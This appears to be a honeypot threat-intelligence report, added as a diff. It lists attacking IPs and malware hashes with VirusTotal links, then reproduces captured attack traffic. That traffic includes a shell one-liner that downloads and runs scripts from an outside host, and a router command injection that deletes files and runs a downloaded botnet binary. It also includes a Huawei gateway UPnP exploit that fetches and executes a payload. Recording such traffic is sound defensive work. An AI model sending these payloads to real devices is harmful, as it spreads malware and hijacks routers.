@@ -1,0 +1,33 @@
+Top 5 IPs for 2024-02-11:
+
+47.243.47.116
+60.19.12.177
+117.220.150.103
+190.77.221.184
+110.77.170.56
+
+Malware download: 
+26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b
+https://www.virustotal.com/gui/file/7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+Malcious Commands seen:
+
+cd /data/local/tmp/; busybox wget http://42.96.2.220/w.sh; sh w.sh; curl http://42.96.2.220/c.sh; sh c.sh; wget http://42.96.2.220/wget.sh; sh wget.sh; curl http://42.96.2.220/wget.sh; sh wget.sh; busybox wget http://42.96.2.220/wget.sh; sh wget.sh; busybox curl http://42.96.2.220/wget.sh; sh wget.sh
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *arm*; rm -rf *arm5*; rm -rf *arm6*; rm -rf *arm7*; rm -rf *m68k*; rm -rf *mips*; rm -rf *mpsl*; rm -rf *ppc*; rm -rf *sh4*; rm -rf *spc*; rm -rf *x86*; rm -rf *x86_64*;wget http://103.67.197.87/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;
+
+
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"
+Content-Length: 467
+
+<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 193.233.193.12 -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
